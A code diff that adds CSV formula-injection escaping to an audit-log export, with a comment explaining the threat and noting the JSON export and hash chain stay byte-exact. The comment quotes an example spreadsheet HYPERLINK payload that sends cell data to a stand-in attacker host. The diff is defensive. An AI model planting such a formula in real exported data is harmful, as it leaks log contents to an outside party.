@@ -22,9 +22,24 @@ const EXPORT_COLUMNS = [
     'details', 'ip_address', 'user_agent', 'prev_hash', 'row_hash',
 ];
 
+// Excel, LibreOffice and Google Sheets evaluate any cell whose first character
+// is one of these as a formula. Several exported columns carry attacker-chosen
+// text — user_agent and ip_address come straight off the request, and details
+// can embed request data — so a holder of an API key can plant
+// `=HYPERLINK("https://attacker/?d="&A2,"Open")` in a log the account owner
+// later opens. The leading apostrophe is the standard mitigation: spreadsheets
+// treat the rest as literal text.
+//
+// It does alter the byte the reader sees, which matters for a compliance
+// artifact — so it is applied ONLY to the CSV rendering. The JSON export is
+// byte-exact, and the row_hash/prev_hash columns are computed from the stored
+// values, so offline chain verification is unaffected either way.
+const FORMULA_LEAD = /^[=+\-@\t\r]/;
+
 function csvCell(value) {
     if (value === null || value === undefined) return '';
-    const s = String(value);
+    let s = String(value);
+    if (FORMULA_LEAD.test(s)) s = `'${s}`;
     // Quote when the value could break the row/column structure, and double
     // any embedded quote per RFC 4180.
     return /[",\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
